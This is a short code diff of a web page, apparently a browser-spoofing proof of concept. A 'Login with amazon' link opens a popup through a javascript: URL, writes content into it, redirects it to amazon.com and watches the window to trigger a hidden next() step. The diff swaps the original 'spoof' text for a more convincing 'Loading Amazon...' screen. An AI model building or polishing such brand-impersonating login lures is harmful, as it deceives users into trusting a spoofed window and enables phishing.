@@ -4,9 +4,21 @@
         }
 
   function f() {
-    w = window.open("javascript:setTimeout(function(){document.write('spoof');location='http://amazon.com'}, 50)","new","width=500 height=500");// Rest tetap sama dengan interval yang reasonable
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
-  }
+    w = window.open("javascript:document.write('<div style=\"padding:20px\">Loading Amazon...</div>');setTimeout(function(){location='http://amazon.com'}, 2000)","new","width=500,height=500");
+    
+    function checkClosed() {
+        try {
+            if (w.closed) {
+                next();
+            } else {
+                setTimeout(checkClosed, 100);
+            }
+        } catch(e) {
+            next();
+        }
+    }
+    setTimeout(checkClosed, 100);
+}
 </script>
 
 <a href="#" onclick="f()">Login with amazon</a>
